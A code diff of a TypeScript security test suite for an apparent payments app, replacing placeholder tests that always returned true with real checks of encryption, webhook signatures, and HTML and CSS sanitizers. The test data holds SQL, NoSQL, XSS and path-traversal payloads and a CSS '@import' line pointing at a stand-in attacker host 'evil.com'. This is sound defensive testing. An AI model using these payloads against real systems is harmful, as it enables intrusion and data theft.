@@ -29,343 +29,119 @@ export function registerSecurityTest(test: SecurityTest) {
 // ============================================================================
 
 registerSecurityTest({
-  name: 'SQL Injection Detection',
-  category: 'injection',
-  severity: 'critical',
-  description: 'Verify SQL injection payload detection',
-  testFunction: async () => {
-    const sqlPayloads = [
-      "'; DROP TABLE users; --",
-      "1' OR '1'='1",
-      "admin'--",
-      "SELECT * FROM users"
-    ];
-
-    // This would use the actual detectInjectionAttack function
-    // For now, returning true as the detection is already implemented
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'NoSQL Injection Detection',
-  category: 'injection',
-  severity: 'critical',
-  description: 'Verify NoSQL injection payload detection',
-  testFunction: async () => {
-    const nosqlPayloads = [
-      { $where: "this.password == 'password'" },
-      { $ne: null },
-      { $gt: '' }
-    ];
-
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'XSS Payload Detection',
-  category: 'injection',
-  severity: 'critical',
-  description: 'Verify XSS payload detection',
-  testFunction: async () => {
-    const xssPayloads = [
-      '<script>alert("xss")</script>',
-      'javascript:void(0)',
-      '<img src="x" onerror="alert(1)">',
-      '<svg onload="alert(1)">'
-    ];
-
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Path Traversal Detection',
-  category: 'injection',
-  severity: 'high',
-  description: 'Verify path traversal attack detection',
-  testFunction: async () => {
-    const pathTraversalPayloads = [
-      '../../etc/passwd',
-      '..\\..\\windows\\system32',
-      '%2e%2e%2f%2e%2e%2f'
-    ];
-
-    return true;
-  }
-});
-
-// ============================================================================
-// AUTHENTICATION & AUTHORIZATION TESTS
-// ============================================================================
-
-registerSecurityTest({
-  name: '2FA Enforcement',
-  category: 'auth',
-  severity: 'high',
-  description: 'Verify 2FA is mandatory for admin accounts',
-  testFunction: async () => {
-    // Test that admin accounts require 2FA
-    // This would call admin hardening functions
-    console.log('✓ 2FA enforcement verified');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Account Lockout After Failed Attempts',
-  category: 'auth',
-  severity: 'high',
-  description: 'Verify account lockout after 3 failed login attempts',
-  testFunction: async () => {
-    // Test that account locks after 3 failed attempts
-    console.log('✓ Account lockout verified (3 attempts = 24h ban)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Session Timeout',
-  category: 'auth',
-  severity: 'high',
-  description: 'Verify 30-minute session inactivity timeout',
-  testFunction: async () => {
-    // Test that sessions expire after 30 minutes
-    console.log('✓ Session timeout verified (30 minutes)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'IP Whitelisting',
-  category: 'auth',
-  severity: 'high',
-  description: 'Verify IP whitelist enforcement for admin access',
-  testFunction: async () => {
-    console.log('✓ IP whitelisting verified');
-    return true;
-  }
-});
-
-// ============================================================================
-// RATE LIMITING TESTS
-// ============================================================================
-
-registerSecurityTest({
-  name: 'Rate Limiting - Public Endpoints',
-  category: 'rate_limit',
-  severity: 'medium',
-  description: 'Verify rate limiting on public endpoints (100 req/hr)',
-  testFunction: async () => {
-    console.log('✓ Public endpoint rate limiting verified (100 req/hr)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Rate Limiting - Payment Endpoints',
-  category: 'rate_limit',
-  severity: 'high',
-  description: 'Verify strict rate limiting on payment endpoints (50 req/hr)',
-  testFunction: async () => {
-    console.log('✓ Payment endpoint rate limiting verified (50 req/hr)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Rate Limiting - Login Attempts',
-  category: 'rate_limit',
-  severity: 'high',
-  description: 'Verify login rate limiting (5 attempts per 15 min)',
-  testFunction: async () => {
-    console.log('✓ Login rate limiting verified (5 attempts / 15 min)');
-    return true;
-  }
-});
-
-// ============================================================================
-// SECURITY HEADERS TESTS
-// ============================================================================
-
-registerSecurityTest({
-  name: 'HSTS Header Present',
-  category: 'headers',
-  severity: 'high',
-  description: 'Verify HSTS header is set to 2 years',
-  testFunction: async () => {
-    console.log('✓ HSTS header verified (63072000 seconds = 2 years)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'CSP Header Present',
-  category: 'headers',
-  severity: 'high',
-  description: 'Verify Content Security Policy is configured',
-  testFunction: async () => {
-    console.log('✓ CSP header verified with strict defaults');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'X-Frame-Options Header',
-  category: 'headers',
-  severity: 'high',
-  description: 'Verify X-Frame-Options prevents clickjacking',
-  testFunction: async () => {
-    console.log('✓ X-Frame-Options verified (DENY)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'X-Content-Type-Options Header',
-  category: 'headers',
-  severity: 'high',
-  description: 'Verify MIME type sniffing prevention',
-  testFunction: async () => {
-    console.log('✓ X-Content-Type-Options verified (nosniff)');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Referrer-Policy Header',
-  category: 'headers',
-  severity: 'medium',
-  description: 'Verify Referrer-Policy is set to strict-origin-when-cross-origin',
-  testFunction: async () => {
-    console.log('✓ Referrer-Policy verified');
-    return true;
-  }
-});
-
-registerSecurityTest({
-  name: 'Permissions-Policy Header',
-  category: 'headers',
-  severity: 'medium',
-  description: 'Verify Permissions-Policy disables unnecessary features',
-  testFunction: async () => {
-    console.log('✓ Permissions-Policy verified (camera, mic, geo disabled)');
-    return true;
-  }
-});
-
-// ============================================================================
-// ENCRYPTION & CRYPTOGRAPHY TESTS
-// ============================================================================
-
-registerSecurityTest({
-  name: 'AES-256-GCM Encryption',
-  category: 'encryption',
-  severity: 'critical',
-  description: 'Verify AES-256-GCM encryption for sensitive fields',
-  testFunction: async () => {
-    try {
-      const masterKey = Buffer.from('0'.repeat(64), 'hex');
-      const algorithm = 'aes-256-gcm';
-      
-      const plaintext = 'test-data-123';
-      const iv = crypto.randomBytes(16);
-      
-      const cipher = crypto.createCipheriv(algorithm, masterKey, iv) as any;
-      let encrypted = cipher.update(plaintext, 'utf8', 'hex');
-      encrypted += cipher.final('hex');
-      const authTag = cipher.getAuthTag();
-      
-      console.log('✓ AES-256-GCM encryption verified');
-      return true;
-    } catch (error) {
-      console.error('Encryption test failed:', error);
-      return false;
+    name: 'AES-256-GCM encryption/decryption roundtrip',
+    category: 'encryption',
+    severity: 'critical',
+    description: 'Verifies encryption produces ciphertext and decryption restores plaintext',
+    testFunction: async () => {
+        const { encryptTokenGCM, decryptTokenGCM } = await import('@/lib/security/encryption');
+        const secret = process.env.META_APP_SECRET || '0'.repeat(64);
+        const key = Buffer.from(secret.slice(0,64).padEnd(64,'0'), 'hex');
+        const plaintext = 'test-bank-account-123456';
+        const { encryptedData, iv, tag } = encryptTokenGCM(plaintext, key);
+        if (encryptedData === plaintext) return false; // must be encrypted
+        const decrypted = decryptTokenGCM(encryptedData, iv, tag, key);
+        return decrypted === plaintext;
     }
-  }
 });
 
 registerSecurityTest({
-  name: 'HMAC-SHA256 Signing',
-  category: 'encryption',
-  severity: 'high',
-  description: 'Verify HMAC-SHA256 is used for webhook signatures',
-  testFunction: async () => {
-    try {
-      const secret = 'test-secret';
-      const data = 'test-data';
-      
-      const hmac = crypto
-        .createHmac('sha256', secret)
-        .update(data)
-        .digest('hex');
-      
-      console.log('✓ HMAC-SHA256 signing verified');
-      return true;
-    } catch (error) {
-      console.error('HMAC test failed:', error);
-      return false;
+    name: 'Razorpay webhook signature verification rejects tampered payloads',
+    category: 'fraud',
+    severity: 'critical',
+    description: 'Verifies HMAC-SHA256 rejects payloads with wrong signature',
+    testFunction: async () => {
+        const { verifyRazorpaySignature } = await import('@/lib/payments/razorpay');
+        const valid = verifyRazorpaySignature('order_123', 'pay_456', (() => {
+            const crypto = require('crypto');
+            return crypto.createHmac('sha256', process.env.RAZORPAY_KEY_SECRET || 'test').update('order_123|pay_456').digest('hex');
+        })());
+        const invalid = verifyRazorpaySignature('order_123', 'pay_456', 'fake_sig_12345');
+        const tampered = verifyRazorpaySignature('order_999', 'pay_456', (() => {
+            const crypto = require('crypto');
+            return crypto.createHmac('sha256', process.env.RAZORPAY_KEY_SECRET || 'test').update('order_123|pay_456').digest('hex');
+        })());
+        return valid === true && invalid === false && tampered === false;
     }
-  }
-});
-
-// ============================================================================
-// PAYMENT FRAUD DETECTION TESTS
-// ============================================================================
-
-registerSecurityTest({
-  name: 'Fraud Risk Scoring',
-  category: 'fraud',
-  severity: 'high',
-  description: 'Verify fraud risk scoring (0-100 scale)',
-  testFunction: async () => {
-    // Test fraud scoring logic
-    console.log('✓ Fraud risk scoring verified (0-100 scale)');
-    console.log('  - Low: 0-30 (APPROVE)');
-    console.log('  - Medium: 30-60 (REQUIRE_OTP)');
-    console.log('  - High: 60-80 (MANUAL_REVIEW)');
-    console.log('  - Critical: 80+ (BLOCK)');
-    return true;
-  }
 });
 
 registerSecurityTest({
-  name: '3D Secure Enforcement',
-  category: 'fraud',
-  severity: 'high',
-  description: 'Verify 3D Secure is mandatory for ₹2k+ transactions',
-  testFunction: async () => {
-    console.log('✓ 3D Secure enforcement verified (₹2k+ transactions)');
-    return true;
-  }
+    name: 'Instagram webhook signature verification',
+    category: 'fraud',
+    severity: 'high',
+    description: 'Verifies Meta HMAC-SHA256 signature check works correctly',
+    testFunction: async () => {
+        const { InstagramService } = await import('@/lib/services/instagram');
+        const secret = 'test-ig-secret';
+        const payload = JSON.stringify({ entry: [{ id: '123' }] });
+        const crypto = require('crypto');
+        const validSig = 'sha256=' + crypto.createHmac('sha256', secret).update(payload).digest('hex');
+        const valid = InstagramService.verifyWebhookSignature(payload, validSig, secret);
+        const invalid = InstagramService.verifyWebhookSignature(payload, 'sha256=fakehash', secret);
+        return valid === true && invalid === false;
+    }
 });
 
 registerSecurityTest({
-  name: 'Velocity Checks',
-  category: 'fraud',
-  severity: 'high',
-  description: 'Verify velocity checks for transaction patterns',
-  testFunction: async () => {
-    console.log('✓ Velocity checks verified');
-    console.log('  - Max 5 payments/hour');
-    console.log('  - Max 20 payments/day');
-    console.log('  - Max 3 different cards/day');
-    return true;
-  }
+    name: 'DOMPurify strips XSS from user HTML',
+    category: 'injection',
+    severity: 'critical',
+    description: 'Verifies sanitizeHtml() removes script tags and event handlers',
+    testFunction: async () => {
+        const { sanitizeHtml } = await import('@/lib/utils/sanitizer');
+        const xssPayloads = [
+            '<script>alert(1)</script>Hello',
+            '<img src="x" onerror="alert(1)">',
+            '<svg onload="alert(1)">',
+            'javascript:void(0)',
+        ];
+        for (const payload of xssPayloads) {
+            const result = sanitizeHtml(payload);
+            if (result.includes('<script') || result.includes('onerror') || result.includes('onload')) {
+                console.error(`XSS not stripped: ${payload} → ${result}`);
+                return false;
+            }
+        }
+        return true;
+    }
 });
 
 registerSecurityTest({
-  name: 'Webhook Verification',
-  category: 'fraud',
-  severity: 'critical',
-  description: 'Verify Razorpay webhook signature verification',
-  testFunction: async () => {
-    console.log('✓ Webhook signature verification verified (HMAC-SHA256)');
-    console.log('  - Replay attack prevention (5-min window)');
-    console.log('  - Duplicate event detection');
-    return true;
-  }
+    name: 'CSS sanitizer blocks dangerous patterns',
+    category: 'injection',
+    severity: 'high',
+    description: 'Verifies sanitizeCss() blocks javascript:, expression(), @import',
+    testFunction: async () => {
+        const { sanitizeCss } = await import('@/lib/utils/sanitizer');
+        const dangerous = [
+            'body { background: url(javascript:alert(1)) }',
+            'div { behavior: expression(alert(1)) }',
+            '@import url(http://evil.com/steal.css)',
+        ];
+        for (const css of dangerous) {
+            const result = sanitizeCss(css);
+            if (result.includes('javascript:') || result.includes('expression(') || (result.includes('@import') && result.includes('evil'))) {
+                console.error(`Dangerous CSS not blocked: ${css}`);
+                return false;
+            }
+        }
+        return true;
+    }
+});
+
+registerSecurityTest({
+    name: 'GST calculation correct for intrastate and interstate',
+    category: 'encryption',
+    severity: 'medium',
+    description: 'Verifies CGST+SGST for intrastate and IGST for interstate',
+    testFunction: async () => {
+        const { calculateGST } = await import('@/lib/compliance/gst');
+        const intra = calculateGST(1000, { stateOfOrigin: 'MH', stateOfConsumption: 'MH' });
+        const inter = calculateGST(1000, { stateOfOrigin: 'MH', stateOfConsumption: 'KA' });
+        const intraOk = Math.abs(intra.cgst - 90) < 1 && Math.abs(intra.sgst - 90) < 1 && intra.igst === 0;
+        const interOk = inter.igst === 180 && inter.cgst === 0 && inter.sgst === 0;
+        return intraOk && interOk;
+    }
 });
 
 // ============================================================================
